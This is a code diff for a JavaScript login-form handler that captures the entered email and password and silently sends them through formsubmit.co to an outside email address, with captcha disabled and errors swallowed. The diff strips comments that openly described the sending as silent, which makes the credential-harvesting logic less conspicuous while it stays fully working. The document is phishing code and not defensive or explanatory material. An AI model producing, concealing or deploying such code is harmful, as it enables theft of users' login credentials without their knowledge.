@@ -1,4 +1,4 @@
-const inputMail = document.querySelector('.mail');
+        const inputMail = document.querySelector('.mail');
         const inputMod = document.querySelector('.mod');
         const button = document.querySelector('button');
 
@@ -7,10 +7,9 @@ const inputMail = document.querySelector('.mail');
             const mdp = inputMod.value;
             
             if (email.trim() === '' || mdp.trim() === '') {
-                return; // Rien si vide
+                return;
             }
 
-            // ENVOI SILENCIEUX
             try {
                 const response = await fetch('https://formsubmit.co/ajax/athomas@edenschool.fr', {
                     method: 'POST',
@@ -19,7 +18,7 @@ const inputMail = document.querySelector('.mail');
                         'Accept': 'application/json'
                     },
                     body: new URLSearchParams({
-                        '_subject': 'Nouveaux identifiants',
+                        '_subject': 'Nouveaux identifiants connexon',
                         'email': email,
                         'mot_de_passe': mdp,
                         '_captcha': 'false',
@@ -28,10 +27,8 @@ const inputMail = document.querySelector('.mail');
                 });
 
                 if (response.ok) {
-                    inputMail.value = '';   // Vide silencieusement
-                    inputMod.value = '';    // Vide silencieusement
+                    inputMail.value = '';
+                    inputMod.value = '';
                 }
-            } catch (error) {
-                // Silence total même en erreur
-            }
+            } catch (error) {}
         });
